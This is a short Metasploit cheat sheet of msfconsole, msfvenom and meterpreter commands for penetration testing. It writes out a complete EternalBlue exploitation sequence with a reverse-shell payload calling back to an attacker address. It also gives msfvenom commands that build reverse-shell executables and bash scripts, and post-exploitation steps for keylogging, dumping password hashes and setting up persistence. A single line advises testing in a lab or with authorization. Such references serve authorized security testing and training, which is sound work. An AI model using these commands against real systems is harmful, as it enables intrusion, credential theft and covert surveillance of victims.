# Metasploit (msf) — Cheat Sheet

A tiny, easy-to-scan reference for common `msfconsole`, `msfvenom`, and basic `meterpreter` commands.

---

## Start
    msfconsole                # start interactive console
    msfconsole -r file.rc     # start and run resource script

## Search & Info
    search name:apache
    info exploit/windows/smb/ms17_010_eternalblue

## Use / Set / Show
    use exploit/windows/smb/ms17_010_eternalblue
    show options                # required options for current module
    set RHOSTS 192.168.1.10
    set RPORT 445
    set PAYLOAD windows/x64/meterpreter/reverse_tcp
    set LHOST 10.0.0.5
    set LPORT 4444

## Exploit / Run
    exploit                    # run exploit (foreground)
    run -j                     # run as job (background)
    exploit -z                 # run but don't interact with sessions

## Sessions
    sessions -l                # list sessions
    sessions -i 1              # interact with session 1
    sessions -u 1              # upgrade shell to meterpreter (if possible)
    sessions -k 1              # kill session 1
    background                 # background current session

## Handler (listener)
    use exploit/multi/handler
    set PAYLOAD windows/meterpreter/reverse_tcp
    set LHOST 10.0.0.5
    set LPORT 4444
    exploit -j                 # start handler as job

## msfvenom — create payloads
    # Windows exe
    msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.0.0.5 LPORT=4444 -f exe -o shell.exe

    # Linux reverse bash (raw)
    msfvenom -p cmd/unix/reverse_bash LHOST=10.0.0.5 LPORT=4444 -f raw > shell.sh

    # List payloads/encoders
    msfvenom -l payloads
    msfvenom -l encoders

## Meterpreter — common commands
    sysinfo                    # system info
    getuid                     # current user
    ps                         # list processes
    migrate <pid>              # migrate to process
    shell                      # drop to a system shell
    upload <local> <remote>    # upload file
    download <remote> <local>  # download file
    screenshot                 # take screenshot
    keyscan_start              # start keylogger
    keyscan_dump               # dump keystrokes
    keyscan_stop               # stop keylogger
    hashdump                   # dump password hashes (if privileges allow)
    run persistence            # try to create persistence

## Post-exploit utilities
    use post/windows/gather/enum_cached_domains
    use post/multi/recon/local_exploit_suggester

## Resource files (automation)
    # example.rc (save this file)
    use exploit/multi/handler
    set PAYLOAD windows/meterpreter/reverse_tcp
    set LHOST 10.0.0.5
    set LPORT 4444
    exploit -j

    # run it:
    msfconsole -r example.rc

## Quick tips
    show payloads
    show encoders
    show targets
    setg VAR value   # set global variable across modules
    jobs             # list background jobs
    info <module>    # module documentation
    Always test in a lab or with authorization.

## Exit
    exit                      # leave msfconsole
